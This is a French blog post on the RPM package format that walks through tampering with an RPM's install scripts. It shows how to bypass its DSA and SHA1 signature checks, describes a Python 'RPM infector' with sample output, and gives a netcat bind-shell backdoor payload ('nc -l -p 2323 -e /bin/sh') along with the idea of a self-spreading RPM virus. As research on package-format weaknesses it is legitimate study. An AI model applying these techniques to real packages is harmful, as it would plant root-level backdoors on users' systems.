---
title: "Attaques sur le format RPM"
tags: [Virus]
---

## Introduction  

Les applications Open Source ont une bonne réputation en termes de sécurité et de respect de la vie privée, car tout le monde peut jeter un coup d'œil au code et détecter une éventuelle faille ou système espion. Cela a par exemple permis de détecter rapidement [la présence d'une backdoor dans Wordpress](http://wordpress.org/development/2007/03/upgrade-212/) avant que trop de dégats soient causés.  

Mais afin que les utilisateurs puissent installer rapidement et sans connaissances en programmation des logiciels sous Linux, divers formats d'archivage ont été créé comme le format rpm et le format deb.  

Les fichiers rpm, que l'on peut comparer aux installeurs sous Windows, sont couramment utilisés par les débutants comme les plus confirmés. C'est aussi un format utilisé pour distribuer des applications closed-source comme [Opera](http://www.opera.com/).  

C'est pour cela que j'ai décidé de jeter un coup d'œil au format RPM pour essayer de trouver en angle d'attaque.  

## Le format RPM : un format casse-bonbon  

J'avais regardé une première fois les spécifications il y a quelque temps, histoire d'avoir un aperçu du format RPM. Mais le document qui me servait de référence n'était [pas à jour](http://www.linux-foundation.org/spec/refspecs/LSB_1.3.0/gLSB/gLSB/swinstall.html).  

En fait même si la structure générale n'a pas évolué, des valeurs ayant une signification bien définie (les *"tags"* que nous verront plus tard) continuent à être ajoutés au format.  

Un fichier RPM peut être divisé en 4 parties :  

* L'entête définissant l'archive RPM elle-même
* Une section de signatures permettant de vérifier l'intégrité de l'archive RPM
* Une section définissant les fichiers une fois désarchivés
* Les fichiers, compactés au format [cpio](http://en.wikipedia.org/wiki/Cpio) et compressés avec gzip

Les documents qui m'ont aidé à comprendre ce format sont les suivants :  

[Linux Standard Base Specification 1.3 : Package File Format](http://www.linux-foundation.org/spec/refspecs/LSB_1.3.0/gLSB/gLSB/swinstall.html)  

[Linux Standard Base Core Specification 3.1 : Package File Format](http://refspecs.freestandards.org/LSB_3.1.0/LSB-Core-generic/LSB-Core-generic/pkgformat.html)  

[Maximum RPM : RPM File Format](http://www.rpm.org/max-rpm-snapshot/s1-rpm-file-format-rpm-file-format.html)  

[Fedora Project : RPM Package File Structure](http://docs.fedoraproject.org/drafts/rpm-guide-en/ch-package-structure.html)  

Le *lead* (ou `rpmlead`) est la première section du fichier. Il donne des informations sur la version du format RPM utilisé, l'architecture et le système d'exploitation auxquels sont destinés les exécutables, etc.

```c
struct rpmlead {
    unsigned char magic[4];
    unsigned char major, minor;
    short type;
    short archnum;
    char name[66];
    short osnum;
    short signature_type;
    char reserved[16];
} ;
```

Il faut noter que ce lead se termine par 16 octets non utilisés, car réservés pour une éventuelle utilisation future.  
Ce que l'on retiendra pour cette section est que sa taille est de 96 octets.  

La seconde et la troisième partie d'un fichier RPM (signatures et headers) sont construites sur le même modèle.  

Cela commence par un entête qui indique le nombre d'éléments présents dans la section ainsi que la taille globale des données de cette section. Cet entête fait 16 octets et est le suivant :  

```c
struct rpmheader {
    unsigned char magic[4];
    unsigned char reserved[4];
    int nindex;
    int hsize;
} ;
```

Le `magic` qui sert à identifier le début de la section est fixé à trois octets dont la valeur est `\x8e\xad\xe8`. Un quatrième octet permet de spécifier le numéro de version de la structure.  

Le `nindex` donne le nombre d'entrées présentes dans la section et le `hsize` la somme de la taille des entrées (plus explicitement la somme du contenu de chaque entrée).  

En effet, après ce header on a deux sections dans cette structure : les descripteurs des entrées et les entrées elles-même. Les descripteurs sont regroupés. Viennent ensuite les données plaçées les unes après les autres.  
Une section ressemblera par exemple à ça :  

![RPM file structure](/assets/img/rpmstruct.png)

Les `index record`, représentés ici en vert-jaune, sont les descripteurs dont nous avons parlé. Leur taille est de 16 octets chacun, leur structure est la suivante :  

```c
struct rpmhdrindex {
    int tag;
    int type;
    int offset;
    int count;
} ;
```

Le `tag` sert à définir l'utilité (l'identité) de l'entrée. Chaque valeur du `tag` a sa signification et on peut trouver des tableaux de correspondance dans les documents que j'ai cités. Selon que l'on soit dans la section `Signature` ou la section `Header`, ces valeurs n'auront pas la même signification.  

Le `type` défini le contenu de l'entrée, s'il s'agit d'un entier de 32 bits, d'une chaine de caractères, d'un tableau de chaines, etc.  
Viennent ensuite l'`offset` (adresse) définissant le placement en octets où se trouve le contenu de l'entrée ainsi que `count` qui correspond à la taille de l'entrée en octets.  

Si ces deux variables sont présentes, c'est que, comme le montre l'image, les entrées ne sont par forcément dans le bon ordre. De plus du *padding* (de l'espace vide) peut être présent entre deux entrées.  
Notez aussi que l'`offset` correspond à l'adresse relative au début des entrées. Ainsi dans mon image, l'`offset` de l'`index` numéro 2 sera 0.  

La quatrième et dernière section correspond aux fichiers contenus dans l'archive, regroupés au format `cpio` et compressés avec `gzip`. Ces données étant difficilement accessibles (il faut passer par une décompression pour y accéder) nous ne nous y intéresserons pas. De plus cela sortirait quelque peu du format RPM.  

## Tagging  

On va plutôt fouiller du côté des tags de la troisième section (Header).  

La liste des tags listés sur [le document de Fedora](http://docs.fedoraproject.org/drafts/rpm-guide-en/ch-package-structure.html) est divisée en plusieurs catégories :  

* _Header entry tag identifiers_ : ce sont les tags renseignant sur le logiciel, son nom, sa licence, sa catégorie logicielle, sa description...
* _Installation tags_ : décrivent quelques opérations doivent être effectuées et comment après installation et/ou avant la désinstallation.
* _File information tags_ : décrit les droits, les propriétaires, les sommes MD5, les dates de modification... de chaque fichier.
* _Dependency tags_ : donne la liste des logiciels nécessaires au bon fonctionnement du présent logiciel

Les tags d'information sont assez sensibles. On pourrait par exemple faire en sorte qu'un fichier soit world-writeable (écrasable par tous) ou qu'un exécutable ait le bit setuid root. Mais cette possibilité n'est pas assez générale et risque d'être trop dépendante du logiciel.  

## Scripts d'installation  

Nous allons plutôt nous pencher sur les tags servant à préparer/finaliser l'installation ou la désinstallation d'un RPM.  

Les fichiers RPM peuvent spécifier deux séries de commandes qui seront respectivement installées après l'installation et avant la désinstallation. Ces scripts sont présents dans la section Header (ce sont des `index record`) et sont donc accessibles en clair dans le fichier.  

Les tags concernant les scripts de pre/post-install sont les suivants :  

* 1023 = `RPMTAG_PREIN` : script de pré-installation
* 1024 = `RPMTAG_POSTIN` : script de post-installation
* 1025 = `RPMTAG_PREUN` : script de pré-désinstallation
* 1026 = `RPMTAG_POSTUN` : script de post-désinstallation
* 1085 = `RPMTAG_PREINPROG` : interpréteur utilisé pour le script de pré-installation
* 1086 = `RPMTAG_POSTINPROG` : interpréteur utilisé pour le script de post-installation
* 1087 = `RPMTAG_PREUNPROG` : interpréteur utilisé pour le script de pré-désinstallation
* 1088 = `RPMTAG_POSTUNPROG` : interpréteur utilisé pour le script de post-désinstallation

Pour effectuer mes tests, j'ai utilisé [le RPM du logiciel Netcat](http://netcat.sourceforge.net/download.php), le couteau suisse réseau.  

On peut facilement vérifier la présence de ces scripts dans le RPM avec la commande suivante :  

```console
$ rpm -q --scripts -p netcat-0.7.1-1.i386.rpm
attention: netcat-0.7.1-1.i386.rpm: Entête V3 DSA signature: NOKEY, key ID b2d79fc1
postinstall scriptlet (using /bin/sh):
/sbin/install-info /usr/share/info/netcat.info.gz /usr/share/info/dir
preuninstall scriptlet (using /bin/sh):
if [ "$1" = 0 ]; then
    /sbin/install-info --delete /usr/share/info/netcat.info.gz /usr/share/info/dir
fi
```

Ici seulement deux scripts sont présents (post-installation et pré-désinstallation) et `/bin/sh` est l'interpréteur utilisé.  

## Let's go !  

Si vous désirez étudier la structure d'un fichier RPM je vous conseille d'utiliser le programme [Hachoir](http://hachoir.org/) qui a une belle interface ncurses (ou wxWidgets) pour décortiquer chaque section.  

Par contre, sous Hachoir les `magics` sont nommés *signatures* et les tags ne sont pas distingués selon que l'on se trouve dans la 2ᵉ ou la 3ᵉ section (ce qui peut porter à confusion).  

Les moins équipés peuvent utiliser un _GHex2_, un _KHexEdit_... ou un _hexdump_.  

Pour les modifications, nous allons utiliser un éditeur hexa quelconque (`ghex2` pour moi).  

On ouvre le fichier, on retrouve les scripts et on les remplace par nos commandes. Il faut prendre soin de ne pas dépasser la taille allouée pour chacun des scripts (un octet null sépare les deux scripts).  
Au final, j'ai les deux scripts suivants (complétés par des espaces en fin de chaine) :  

```bash
echo postinstall;touch /tmp/postinstall
echo preuninstall;touch /tmp/preuninstall
```

Je tente une installation (une mise à jour chez moi, car netcat est déjà présent), et là, c'est le drame :  

```console
# rpm -Uvh netcat-0.7.1-1.i386.rpm
erreur: netcat-0.7.1-1.i386.rpm: Entête V3 DSA signature: BAD, key ID b2d79fc1
erreur: netcat-0.7.1-1.i386.rpm ne peut être installé
```

La section Signatures fait des siennes !! On retrouve dans [la doc](http://refspecs.freestandards.org/LSB_3.1.0/LSB-Core-generic/LSB-Core-generic/pkgformat.html) le numéro de tag correspondant à `RPMSIGTAG_DSA` : 267  

Le format des signatures est décrit dans la [RFC 2440 : OpenPGP Message Format](http://www.ietf.org/rfc/rfc2440.txt).  

Mais nous n'avons ni le temps ni l'envie de nous occuper de cette signature DSA... surtout qu'elle est marquée comme optionnelle dans la spécification RPM !  

Nous retrouvons facilement notre entrée dans le fichier RPM (267 = 0x10B) :  

![RPM signature](/assets/img/hexsign.png)

On passe le 10B en 20B et on réessaye :  

```
erreur: netcat-0.7.1-1.i386.rpm: Hachage de l'entête SHA1: BAD
Expected(d7c18efe6738936c307e957412af73f644e343cc) != (e533a19829c98b3a42d1692aec1b2f5dee17fe32)
erreur: netcat-0.7.1-1.i386.rpm ne peut être installé
```

:(  
Après une nouvelle modification, cette fois du tag `RPMSIGTAG_SHA1` (269 = `0x10D`), on fait un nouvel essai :  

```console
$ rpm -Uvh netcat-0.7.1-1.i386.rpm
Préparation...              ########################################### [100%]
   1:netcat                 ########################################### [100%]
postinstall
```

Bingo !!  

```console
# ls -l /tmp/postinstall
-rw-r--r-- 1 root root 0 mai  8 18:59 /tmp/postinstall
```

g0tr00t ?  

Et si je remets la version précédente de netcat avec YaST, le fichier `/tmp/preuninstall` est créé.  

## Infecteur de RPM  

Pour le plaisir, j'ai développé un programme en Python qui infecte un payload (avec un petit 'p', à ne pas confondre avec le Payload du fichier RPM) et le place à la suite du script de post-installation (le payload doit commencer par le caractère `;`).  
Les étapes réalisées par ce programme sont :  

1. Ouvrir le fichier RPM
2. Passer 104 octets (les 96 octets du `lead` + 8 premiers octets du `Signature Header`)
3. Lire le nombre d'éléments dans la section Signature
4. Lire la taille du _store_ de la Signature (somme totale de la taille des éléments)
5. Lire tous les `rpmhdrindex` de la Signature
6. Repérer celui correspondant à `RPMSIGTAG_SIZE` (1000) qui spécifie la taille que doit faire le Header + Payload
7. Repérer celui correspondant à `RPMSIGTAG_MD5` (1004) qui spécifie le hash MD5 128 bits du Header + Payload
8. Réécrire la table des `rpmhdrindex` en bypassant les signatures qui nous embêtent
9. Réécrire la valeur `RPMSIGTAG_SIZE` en y ajoutant `size(payload)`
10. Lire l'entête de la section Header, en extraire le nombre d'éléments et la taille de son _store_
11. Récupérer l'offset quand le tag est `RPMTAG_POSTIN`
12. Ajouter `size(payload)` à l'offset de toutes les entrées situées après celle correspondant à notre script de post-install
13. Augmenter la taille du store de Header de `size(payload)`
14. Insérer notre payload
15. Recalculer `md5(Header + Payload)` et remplacer la valeur dans la section Signature

Le code est ici : [RPM Infector](/assets/data/rpminfector.py)  

On est reparti :  

```console
# python rpminfector.py
######################
Payload size is 28
Found 7 items in the Signature
Signature store size is 216
Rewriting signature headers
Length of header + payload is 123472
New size is 123500
Found 61 items in header
Store size is 4208
Post-Installation is at offset 642
Calculating new headers
Fixing store size to 4236
Injecting payload
Fixing md5sum to 59bb0a37045eb4e956ec893553cac173
Injection done !

# rpm -Uvvh netcat-0.7.1-1.i386.rpm
D: ============== netcat-0.7.1-1.i386.rpm
D: Taille attendue:       123940 = tête(96)+sigs(344)+pad(0)+données(123500)
D: Taille actuelle:       123940
(...)
########################################### [100%]
(...)
D:   install: %post(netcat-0.7.1-1.i386) asynchronous scriptlet start
D:   install: %post(netcat-0.7.1-1.i386)        execv(/bin/sh) pid 6732
+ /sbin/install-info /usr/share/info/netcat.info.gz /usr/share/info/dir
+ touch /tmp/stuckhereagain
(...)
```

:)  
On obtient une très belle backdoor (dans le cas du RPM de netcat) si on fixe le payload à `;nc -l -p 2323 -e /bin/sh&`  

Il doit être possible de faire un virus RPM, en injectant l'injecteur lui-même (après quelques retouches) et en fixant l'interpréteur à python. En utilisant le champ réservé vu au tout début de l'article, on pourrait aussi marquer les RPM déjà infectés.

*Published January 10 2011 at 06:47*
